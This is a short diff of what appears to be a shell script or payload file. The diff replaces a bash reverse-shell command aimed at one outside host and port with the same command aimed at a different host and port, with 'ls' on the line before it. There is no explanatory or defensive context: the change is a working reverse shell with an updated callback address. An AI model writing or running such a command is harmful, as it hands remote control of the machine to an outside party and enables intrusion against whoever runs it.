@@ -1,2 +1,2 @@
 ls
-/bin/bash -c "bash -i >& /dev/tcp/g0g0.giize.com/1984 0>&1"
+/bin/bash -c "bash -i >& /dev/tcp/bal0.giize.com/7952 0>&1"
